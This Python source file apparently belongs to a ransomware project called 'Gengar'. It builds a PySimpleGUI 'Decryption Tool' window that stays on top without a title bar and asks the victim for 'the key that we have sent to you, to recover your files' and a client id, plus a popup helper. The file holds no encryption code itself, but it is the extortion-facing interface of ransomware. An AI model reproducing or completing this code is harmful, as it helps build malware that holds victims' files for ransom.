import PySimpleGUI as sg


class DecryptionView(object):
    def __init__(self):
        sg.theme('DarkPurple7')
        layout = [[sg.Text('Welcome to Gengar Decryption Tool', font='Helvetica 18')],
               [sg.Text('')],
               [sg.Text(
                   'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
               [sg.InputText()],
               [sg.Text('')],
               [sg.Text(
                   'Introduce your client id here', font='Helvetica 13')],
               [sg.InputText()],
               [sg.Text('')],
               [sg.Button('Decrypt files')]]

        window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')
        self.note = window 
    
    def close_note(self):
        self.note.close()

def pop_up(text=str):
    sg.theme('DarkTeal11')
    sg.Popup(text, keep_on_top=True, no_titlebar=True)
    
